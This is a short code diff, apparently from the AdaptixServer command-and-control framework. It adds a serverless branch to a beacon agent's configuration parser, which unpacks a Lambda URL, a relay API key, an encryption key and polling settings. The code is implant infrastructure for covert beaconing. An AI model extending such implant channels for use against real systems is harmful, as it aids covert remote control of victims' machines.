@@ -1,0 +1,18 @@
+--- a/AdaptixServer/extenders/beacon_agent/src_beacon/beacon/AgentConfig.cpp
++++ b/AdaptixServer/extenders/beacon_agent/src_beacon/beacon/AgentConfig.cpp
+@@ -98,6 +98,15 @@
+ 	this->profile.burst_jitter  = packer->Unpack32();
+ 	this->profile.dns_mode      = packer->Unpack32();
+ 	this->profile.user_agent    = packer->UnpackBytesCopy(&length);
++
++#elif defined(BEACON_SERVERLESS)
++	this->listener_type             = packer->Unpack32();
++	this->profile.lambda_url        = packer->UnpackBytesCopy(&length);
++	this->profile.relay_api_key     = packer->UnpackBytesCopy(&length);
++	this->profile.encrypt_key       = packer->UnpackBytesCopy(&length);
++	this->profile.poll_attempts     = packer->Unpack32();
++	this->profile.poll_interval_ms  = packer->Unpack32();
++	this->profile.user_agent        = packer->UnpackBytesCopy(&length);
+ #endif
+
+ #if defined(BEACON_DNS)
